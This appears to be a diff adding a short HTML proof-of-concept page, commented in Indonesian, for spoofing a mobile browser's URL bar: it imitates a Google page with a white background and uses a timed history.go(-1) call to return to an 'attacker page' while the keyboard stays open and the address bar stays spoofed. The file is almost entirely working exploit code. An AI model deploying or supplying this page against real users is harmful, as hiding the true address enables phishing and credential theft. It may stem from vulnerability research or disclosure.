@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spoof Page - White Background</title>
+    <style>
+        body {
+            background-color: white; /* Kunci: Background putih untuk spoof minibar */
+            color: black; /* Teks normal agar halaman terlihat biasa */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            color: #4285f4; /* Simulasi Google */
+        }
+    </style>
+</head>
+<body>
+    <h1>Google Search (Palsu)</h1>
+    <p>Ini seolah-olah halaman Google, tapi sebenarnya spoof. Keyboard masih terbuka? Cek minibar URL—seharusnya tak terlihat!</p>
+    <p>Navigasi back otomatis dalam 600ms...</p>
+
+    <script>
+        // Timing kritis: Delay 600ms seperti PoC update untuk stabil di Stable/Beta
+        setTimeout(function() {
+            if (history.length > 1) {
+                history.go(-1); // Navigasi back ke attacker page, keyboard tetap, minibar spoofed
+            } else {
+                alert('History tidak cukup panjang. Buka dari halaman sebelumnya.');
+            }
+        }, 600);
+    </script>
+</body>
+</html>
